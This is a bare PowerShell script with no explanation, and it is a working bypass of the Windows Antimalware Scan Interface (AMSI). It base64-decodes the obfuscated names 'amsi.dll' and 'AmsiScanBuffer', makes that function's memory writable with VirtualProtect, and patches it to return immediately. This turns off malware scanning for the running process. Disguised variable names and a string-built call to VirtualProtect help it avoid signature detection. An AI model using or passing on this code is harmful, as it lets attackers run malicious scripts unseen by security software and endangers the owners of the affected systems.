$Win32 = @"
 
using System;
using System.Runtime.InteropServices;
 
public class Win32 {
 
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
 
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
 
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
 
}
"@
 
Add-Type $Win32

function DecodeBase64 {
    param (
        [string]$encodedText
    )
    $bytes = [Convert]::FromBase64String($encodedText)
    $decodedText = [System.Text.Encoding]::Unicode.GetString($bytes)
    return $decodedText
}

function LookupFunc {
    Param (
        [string]$moduleName,
        [string]$functionName
    )

    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() |
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')

    $GetModuleHandle = $assem.GetMethod('GetModuleHandle', [System.Reflection.BindingFlags]::NonPublic -bor [System.Reflection.BindingFlags]::Static)
    $GetProcAddress = $assem.GetMethod('GetProcAddress', [System.Reflection.BindingFlags]::NonPublic -bor [System.Reflection.BindingFlags]::Static)

    $moduleHandle = $GetModuleHandle.Invoke($null, @($moduleName))
    if ($moduleHandle -eq [IntPtr]::Zero) {
        Write-Error "Failed to get module handle for $moduleName"
        return [IntPtr]::Zero
    }

    $functionPtr = $GetProcAddress.Invoke($null, @($moduleHandle, $functionName))
    if ($functionPtr -eq [IntPtr]::Zero) {
        Write-Error "Failed to get address for function $functionName"
    }

    return $functionPtr
}

$e = "YQBtAHMAaQAuAGQAbABsAA=="
$g = "QQBtAHMAaQBTAGMAYQBuAEIAdQBmAGYAZQByAA=="

$n = DecodeBase64 -encodedText $e
$p = DecodeBase64 -encodedText $g 

$notp = 0

$LoadLibrary = [Win32]::LoadLibrary($n) 
$notaddress = [Win32]::GetProcAddress($LoadLibrary, $p)

$replace = ‘VirtualProtect’
[Win32]::(‘{0}{1}’ -f $replace,$c)($notaddress, [uint32]5, 0x40, [ref]$notp)
$soapy = [Byte[]] (0xc3, 0x90, 0x90)
$marshalClass = [System.Runtime.InteropServices.Marshal]
$marshalClass::Copy($soapy, 0, $notaddress, $soapy.Length)

